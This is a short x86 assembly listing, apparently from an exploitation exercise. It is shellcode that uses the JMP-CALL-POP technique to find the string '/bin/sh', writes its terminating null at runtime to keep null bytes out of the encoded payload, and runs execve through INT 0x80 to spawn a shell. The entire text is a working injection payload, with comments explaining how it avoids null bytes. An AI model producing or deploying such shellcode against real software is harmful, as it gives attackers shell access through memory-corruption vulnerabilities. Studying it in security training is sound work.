
JMP _WANT_BIN_BASH;

_GOT_BIN_BASH:
	MOV AL, 0x0B;			# 11 - code for execve, and AL instead of EAX to avoid zeros inside the string we get from assemble.py.
	POP EBX;			# path
	XOR ECX,ECX;			# argv
	XOR EDX,EDX;			# envp
	MOV BYTE PTR [EBX+7], CL;	# change '@' in "/bin/sh@" to zero.
	INT 0x80;

_WANT_BIN_BASH:
	CALL _GOT_BIN_BASH;
	.ASCII "/bin/sh@"; 



